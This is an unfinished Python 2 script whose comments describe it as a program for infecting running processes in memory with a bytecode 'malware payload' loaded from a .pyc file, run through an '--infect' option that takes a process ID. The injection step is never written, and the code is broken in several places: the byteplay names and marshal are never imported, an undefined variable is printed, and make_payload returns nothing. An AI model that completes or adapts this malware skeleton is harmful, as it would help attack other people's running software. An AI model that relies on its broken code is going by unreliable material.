#!/usr/bin/env python

#This program is meant to infect running processes in memory

import getopt, sys, os

def extract_code(data):
    '''This function will extract the assembler code from the code object passed
    to it from the from_code function of byteplay, a list of tuples'''
    last_line = 1
    for i in xrange(2, len(data.code)):
      if data.code[i][0] == SetLineno:
         #Find last line of code to update the real code appropriately 
         last_line = data.code[i][1]
    EXPLOIT_SIZE = len(data.code) - 1
    exploit = data.code[:EXPLOIT_SIZE]
    return(exploit)
    
def make_payload(pf):
    '''This function will extract the malware from the payload file and return
    a code object, which is the malware'''
    
    pf = os.path.abspath(pf)
    #check if file exists or not
    if (os.path.exists(pf)):
        #the file exists
        f = open( pf, 'r')
        #First 8 bytes are magic number and timestamp
        head = f.read(8)
        data = Code.from_code(marshal.loads(f.read()))
        f.close()
        #get the assembler level exploit code that will be injected
        exploit_code=extract_code(data)
        print exploit
        
    else:
        print 'the malware payload file does not exist'
        print 'using built in malware payload'    
        exploit_code=[(SetLineno, 3), (LOAD_CONST, 'malware injected'), (PRINT_ITEM, None), (PRINT_NEWLINE, None), (LOAD_CONST, None), (RETURN_VALUE, None)]
        print exploit
        
def infect_process(a, pf):
    '''This function is going to infect the running process with pid a with a
    malicous payload'''
    
    malware=make_payload(pf)
    
    
def main(argv):
    try:
        opt, args = getopt.getopt(argv, "hi:p:", ["help", "infect=", "payload="])
    except getopt.GetoptError, err:
        print str(err)
        usage()
        sys.exit(2)
    output = None
    verbose = False
    for o, a in opt:
        if o in ("-h", "--help"):
            usage()
            sys.exit()
        if o in ("-p", "--payload"):
            #set payload file
            pf = a
        else:
            #payload has not been set
            #using default payload
            print 'Using default malware payload'
            pf = 'malware.pyc'
        if o in ("-i", "--infect"):
            #infect the process
            infect_process(a, pf)
            
        else:
            assert False, "unhandled option"
            
def usage():
    usage = """
    -h --help                 Prints this
    -i --infect (process_id)  Infect a process
    """
    print usage

if __name__ == "__main__":
    main(sys.argv[1:]) # [1:] slices off the first argument which is the name of the program

